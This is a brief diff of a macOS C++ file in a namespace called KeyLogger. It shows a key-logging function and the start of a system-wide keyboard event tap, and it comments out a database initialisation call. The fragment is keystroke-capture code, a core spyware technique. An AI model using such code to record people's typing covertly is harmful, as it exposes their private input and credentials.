@@ -1,5 +1,6 @@
 #include "logger.h"
 
+
 namespace KeyLogger {
 
     void logKey(int keyCode) {
@@ -16,7 +17,7 @@ namespace KeyLogger {
 
 
     void Init() {
-        DB::init();
+        // DB::init();
 
         CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
         CFMachPortRef eventTap = CGEventTapCreate(
